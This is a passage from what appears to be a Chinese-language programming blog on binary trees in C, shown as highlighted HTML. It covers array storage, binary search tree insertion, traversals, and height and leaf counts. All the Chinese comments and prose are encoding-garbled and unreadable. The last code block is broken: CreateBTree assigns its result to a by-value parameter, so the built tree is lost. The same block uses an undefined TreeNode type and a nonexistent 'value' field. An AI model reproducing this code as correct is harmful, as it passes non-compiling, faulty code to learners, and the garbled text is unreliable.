class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// å®šä¹‰é¡ºåºå­˜å‚¨äºŒå‰æ ‘çš„æœ€å¤§èŠ‚ç‚¹æ•°</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> ElementType; <span class="hljs-comment">// å®šä¹‰èŠ‚ç‚¹å…ƒç´ çš„ç±»å‹</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElementType data[MAX_SIZE]; <span class="hljs-comment">// ç”¨æ•°ç»„å­˜å‚¨äºŒå‰æ ‘çš„èŠ‚ç‚¹</span><br>    <span class="hljs-type">int</span> size;                   <span class="hljs-comment">// è®°å½•äºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡</span><br>&#125; SeqBinaryTree;<br><br><span class="hljs-comment">// åˆå§‹åŒ–äºŒå‰æ ‘</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initTree</span><span class="hljs-params">(SeqBinaryTree *tree)</span> </span>&#123;<br>    tree-&gt;size = <span class="hljs-number">0</span>; <span class="hljs-comment">// åˆå§‹æ—¶äºŒå‰æ ‘ä¸ºç©º</span><br>&#125;<br><br><span class="hljs-comment">// æ·»åŠ èŠ‚ç‚¹åˆ°äºŒå‰æ ‘</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addNode</span><span class="hljs-params">(SeqBinaryTree *tree, ElementType data)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (tree-&gt;size + <span class="hljs-number">1</span> &lt; MAX_SIZE) &#123;<br>        tree-&gt;data[++(tree-&gt;size)] = data;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;äºŒå‰æ ‘å·²æ»¡ï¼Œæ— æ³•æ’å…¥æ›´å¤šèŠ‚ç‚¹ã€‚\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å‰åºéå†äºŒå‰æ ‘ï¼ˆé€’å½’ï¼‰</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preOrderTraverse</span><span class="hljs-params">(SeqBinaryTree *tree, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &gt; tree-&gt;size) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// å¦‚æœç´¢å¼•è¶…è¿‡èŠ‚ç‚¹æ•°ï¼Œåˆ™è¿”å›</span><br><br>    <span class="hljs-comment">// è®¿é—®æ ¹èŠ‚ç‚¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, tree-&gt;data[index]);<br><br>    <span class="hljs-comment">// é€’å½’è®¿é—®å·¦å­©å­</span><br>    <span class="hljs-built_in">preOrderTraverse</span>(tree, <span class="hljs-number">2</span> * index);<br><br>    <span class="hljs-comment">// é€’å½’è®¿é—®å³å­©å­</span><br>    <span class="hljs-built_in">preOrderTraverse</span>(tree, <span class="hljs-number">2</span> * index + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SeqBinaryTree tree;<br>    <span class="hljs-built_in">initTree</span>(&amp;tree);<br><br>    <span class="hljs-comment">// æ·»åŠ èŠ‚ç‚¹ï¼ˆæŒ‰ç…§å±‚æ¬¡é¡ºåºæ·»åŠ ï¼‰</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;A&#x27;</span>); <span class="hljs-comment">// æ ¹èŠ‚ç‚¹</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;B&#x27;</span>); <span class="hljs-comment">// å·¦å­©å­</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;C&#x27;</span>); <span class="hljs-comment">// å³å­©å­</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;D&#x27;</span>); <span class="hljs-comment">// B çš„å·¦å­©å­</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;E&#x27;</span>); <span class="hljs-comment">// B çš„å³å­©å­</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;F&#x27;</span>); <span class="hljs-comment">// C çš„å·¦å­©å­</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;G&#x27;</span>); <span class="hljs-comment">// C çš„å³å­©å­</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‰åºéå†ç»“æœï¼š&quot;</span>);<br>    <span class="hljs-built_in">preOrderTraverse</span>(&amp;tree, <span class="hljs-number">1</span>); <span class="hljs-comment">// ä»æ ¹èŠ‚ç‚¹ï¼ˆç´¢å¼• 1ï¼‰å¼€å§‹å‰åºéå†</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>äºŒå‰æ ‘ç”±èŠ‚ç‚¹ç»„æˆï¼Œæ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li><strong>æ•°æ®åŸŸ</strong>ï¼šå­˜å‚¨èŠ‚ç‚¹çš„æ•°æ®ã€‚</li><li><strong>å·¦å­èŠ‚ç‚¹æŒ‡é’ˆ</strong>ï¼šæŒ‡å‘å·¦å­èŠ‚ç‚¹ã€‚</li><li><strong>å³å­èŠ‚ç‚¹æŒ‡é’ˆ</strong>ï¼šæŒ‡å‘å³å­èŠ‚ç‚¹ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰äºŒå‰æ ‘çš„èŠ‚ç‚¹ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> data;                 <span class="hljs-comment">// èŠ‚ç‚¹çš„æ•°æ®</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">left</span>;</span>    <span class="hljs-comment">// æŒ‡å‘å·¦å­èŠ‚ç‚¹</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">right</span>;</span>   <span class="hljs-comment">// æŒ‡å‘å³å­èŠ‚ç‚¹</span><br>&#125; TreeNode;<br><br><span class="hljs-comment">// åˆ›å»ºèŠ‚ç‚¹</span><br>TreeNode* <span class="hljs-title function_">CreateNode</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br>    TreeNode *node = (TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TreeNode));<br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    node-&gt;data = value;<br>    node-&gt;left = <span class="hljs-literal">NULL</span>;<br>    node-&gt;right = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">// æ’å…¥èŠ‚ç‚¹ï¼ˆåŸºäºäºŒå‰æŸ¥æ‰¾æ ‘çš„æ’å…¥ï¼‰</span><br>TreeNode* <span class="hljs-title function_">Insert</span><span class="hljs-params">(TreeNode *root, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> CreateNode(value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value &lt; root-&gt;data) &#123;<br>        root-&gt;left = Insert(root-&gt;left, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        root-&gt;right = Insert(root-&gt;right, value);<br>    &#125;<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br><br><span class="hljs-comment">// å‰åºéå†</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PreorderTraversal</span><span class="hljs-params">(TreeNode *root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, root-&gt;data);<br>    PreorderTraversal(root-&gt;left);<br>    PreorderTraversal(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// ä¸­åºéå†</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InorderTraversal</span><span class="hljs-params">(TreeNode *root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    InorderTraversal(root-&gt;left);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, root-&gt;data);<br>    InorderTraversal(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// ååºéå†</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PostorderTraversal</span><span class="hljs-params">(TreeNode *root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    PostorderTraversal(root-&gt;left);<br>    PostorderTraversal(root-&gt;right);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, root-&gt;data);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getHeight</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// ç©ºæ ‘çš„é«˜åº¦ä¸º 0</span><br>    &#125;<br>    <span class="hljs-type">int</span> leftHeight = getHeight(root-&gt;left);  <span class="hljs-comment">// å·¦å­æ ‘é«˜åº¦</span><br>    <span class="hljs-type">int</span> rightHeight = getHeight(root-&gt;right); <span class="hljs-comment">// å³å­æ ‘é«˜åº¦</span><br>    <span class="hljs-keyword">return</span> (leftHeight &gt; rightHeight ? leftHeight : rightHeight) + <span class="hljs-number">1</span>; <span class="hljs-comment">// å–è¾ƒå¤§å€¼åŠ  1</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getNodeCount</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// ç©ºæ ‘çš„èŠ‚ç‚¹æ•°ä¸º 0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> getNodeCount(root-&gt;left) + getNodeCount(root-&gt;right) + <span class="hljs-number">1</span>; <span class="hljs-comment">// å·¦å­æ ‘èŠ‚ç‚¹æ•° + å³å­æ ‘èŠ‚ç‚¹æ•° + æ ¹èŠ‚ç‚¹</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getLeafNodeCount</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// ç©ºæ ‘çš„å¶å­èŠ‚ç‚¹æ•°ä¸º 0</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹æ˜¯å¶å­èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> getLeafNodeCount(root-&gt;left) + getLeafNodeCount(root-&gt;right); <span class="hljs-comment">// å·¦å­æ ‘å¶å­èŠ‚ç‚¹æ•° + å³å­æ ‘å¶å­èŠ‚ç‚¹æ•°</span><br>&#125;<br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    TreeNode *root = <span class="hljs-literal">NULL</span>;<br>    root = Insert(root, <span class="hljs-number">5</span>);<br>    root = Insert(root, <span class="hljs-number">3</span>);<br>    root = Insert(root, <span class="hljs-number">7</span>);<br>    root = Insert(root, <span class="hljs-number">2</span>);<br>    root = Insert(root, <span class="hljs-number">4</span>);<br>    root = Insert(root, <span class="hljs-number">6</span>);<br>    root = Insert(root, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‰åºéå†: &quot;</span>);<br>    PreorderTraversal(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸­åºéå†: &quot;</span>);<br>    InorderTraversal(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ååºéå†: &quot;</span>);<br>    PostorderTraversal(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ä»£ç è§£æ"><a href="#ä»£ç è§£æ" class="headerlink" title="ä»£ç è§£æ"></a>ä»£ç è§£æ</h3><ol><li><strong>èŠ‚ç‚¹å®šä¹‰</strong>ï¼š<ul><li>ä½¿ç”¨ç»“æ„ä½“ <code>TreeNode</code> æ¥å®šä¹‰äºŒå‰æ ‘çš„èŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸€ä¸ª <code>data</code> æ•°æ®åŸŸï¼Œä»¥åŠæŒ‡å‘å·¦ã€å³å­èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚</li></ul></li><li><strong>åˆ›å»ºèŠ‚ç‚¹</strong>ï¼š<ul><li>ä½¿ç”¨ <code>CreateNode(int value)</code> å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°èŠ‚ç‚¹ã€‚</li></ul></li><li><strong>æ’å…¥èŠ‚ç‚¹</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Insert(TreeNode *root, int value)</code> å‡½æ•°æ¥å‘äºŒå‰æ ‘ä¸­æ’å…¥èŠ‚ç‚¹ã€‚æ’å…¥èŠ‚ç‚¹çš„è§„åˆ™æ˜¯ï¼šå·¦å­èŠ‚ç‚¹å°äºçˆ¶èŠ‚ç‚¹ï¼Œå³å­èŠ‚ç‚¹å¤§äºçˆ¶èŠ‚ç‚¹ã€‚</li></ul></li><li><strong>éå†æ“ä½œ</strong>ï¼š<ul><li><strong>å‰åºéå†</strong>ï¼šå…ˆè®¿é—®æ ¹èŠ‚ç‚¹ï¼Œå†è®¿é—®å·¦å­æ ‘ï¼Œæœ€åè®¿é—®å³å­æ ‘ã€‚</li><li><strong>ä¸­åºéå†</strong>ï¼šå…ˆè®¿é—®å·¦å­æ ‘ï¼Œå†è®¿é—®æ ¹èŠ‚ç‚¹ï¼Œæœ€åè®¿é—®å³å­æ ‘ã€‚</li><li><strong>ååºéå†</strong>ï¼šå…ˆè®¿é—®å·¦å­æ ‘ï¼Œå†è®¿é—®å³å­æ ‘ï¼Œæœ€åè®¿é—®æ ¹èŠ‚ç‚¹ã€‚</li></ul></li></ol><p>å¯¹åº”ç®—æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 50  <span class="hljs-comment">// æ ˆçš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-comment">// å®šä¹‰äºŒå‰æ ‘èŠ‚ç‚¹ç»“æ„ä½“</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> &#123;</span><br>    <span class="hljs-type">char</span> data;              <span class="hljs-comment">// èŠ‚ç‚¹æ•°æ®</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>* <span class="hljs-title">lchild</span>;</span>  <span class="hljs-comment">// å·¦å­èŠ‚ç‚¹</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>* <span class="hljs-title">rchild</span>;</span>  <span class="hljs-comment">// å³å­èŠ‚ç‚¹</span><br>&#125; BTNode;<br><br><span class="hljs-comment">// å‡½æ•°ï¼šæ ¹æ®æ‹¬å·è¡¨ç¤ºæ³•å»ºç«‹äºŒå‰æ ‘</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateBTree</span><span class="hljs-params">(BTNode* bt, <span class="hljs-type">char</span>* str)</span> &#123;<br>    BTNode* St[MaxSize], *p = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// å®šä¹‰æ ˆå’Œå½“å‰å¤„ç†çš„èŠ‚ç‚¹</span><br>    <span class="hljs-type">int</span> top = <span class="hljs-number">-1</span>, k = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;     <span class="hljs-comment">// æ ˆé¡¶æŒ‡é’ˆï¼Œkè¡¨ç¤ºå·¦/å³å­æ ‘æ ‡å¿—ï¼Œjéå†å­—ç¬¦ä¸²ç´¢å¼•</span><br>    <span class="hljs-type">char</span> ch;<br>    bt = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// åˆå§‹åŒ–æ ‘æ ¹ä¸ºç©º</span><br>    ch = str[j];<br>    <span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;  <span class="hljs-comment">// éå†è¾“å…¥å­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">switch</span> (ch) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;(&#x27;</span>:<br>                top++;<br>                St[top] = p;  <span class="hljs-comment">// å°†å½“å‰èŠ‚ç‚¹å…¥æ ˆ</span><br>                k = <span class="hljs-number">1</span>;        <span class="hljs-comment">// ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºå·¦å­èŠ‚ç‚¹</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;)&#x27;</span>:<br>                top--;  <span class="hljs-comment">// å­æ ‘å¤„ç†å®Œæ¯•ï¼Œå‡ºæ ˆ</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;,&#x27;</span>:<br>                k = <span class="hljs-number">2</span>;  <span class="hljs-comment">// ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºå³å­èŠ‚ç‚¹</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                p = (BTNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BTNode));  <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>                p-&gt;data = ch;<br>                p-&gt;lchild = p-&gt;rchild = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// åˆå§‹åŒ–å·¦å³å­æ ‘ä¸ºç©º</span><br>                <span class="hljs-keyword">if</span> (bt == <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// å¦‚æœæ ‘æ ¹ä¸ºç©ºï¼Œè¯´æ˜å½“å‰èŠ‚ç‚¹æ˜¯æ ¹èŠ‚ç‚¹</span><br>                    bt = p;<br>                &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// å¦åˆ™ï¼Œè¿æ¥å·¦å³å­æ ‘</span><br>                    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>                        St[top]-&gt;lchild = p;  <span class="hljs-comment">// å·¦å­æ ‘</span><br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k == <span class="hljs-number">2</span>) &#123;<br>                        St[top]-&gt;rchild = p;  <span class="hljs-comment">// å³å­æ ‘</span><br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        j++;  <span class="hljs-comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        ch = str[j];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ±‚æ ‘çš„é«˜åº¦</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tree_height</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç©ºæ ‘é«˜åº¦ä¸º0</span><br>    &#125;<br>    <span class="hljs-type">int</span> left_height = tree_height(root-&gt;left);<br>    <span class="hljs-type">int</span> right_height = tree_height(root-&gt;right);<br>    <span class="hljs-keyword">return</span> (left_height &gt; right_height) ? (left_height +<span class="hljs-number">1</span>) : (right_height + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// æ±‚æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">count_nodes</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç©ºæ ‘æ²¡æœ‰èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> count_nodes(root-&gt;left) + count_nodes(root-&gt;right) + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// æ±‚æ ‘çš„å¶å­èŠ‚ç‚¹ä¸ªæ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">count_leaves</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç©ºæ ‘æ²¡æœ‰å¶å­</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å¶å­èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> count_leaves(root-&gt;left) + count_leaves(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// ä»¥æ‹¬å·çš„å½¢å¼è¾“å‡ºäºŒå‰æ ‘</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_tree</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, root-&gt;value);  <span class="hljs-comment">// æ‰“å°æ ¹èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (root-&gt;left || root-&gt;right) &#123;  <span class="hljs-comment">// å¦‚æœæœ‰å­èŠ‚ç‚¹</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(&quot;</span>);<br>        print_tree(root-&gt;left);  <span class="hljs-comment">// æ‰“å°å·¦å­æ ‘</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;,&quot;</span>);<br>        print_tree(root-&gt;right); <span class="hljs-comment">// æ‰“å°å³å­æ ‘</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;)&quot;</span>);<br>    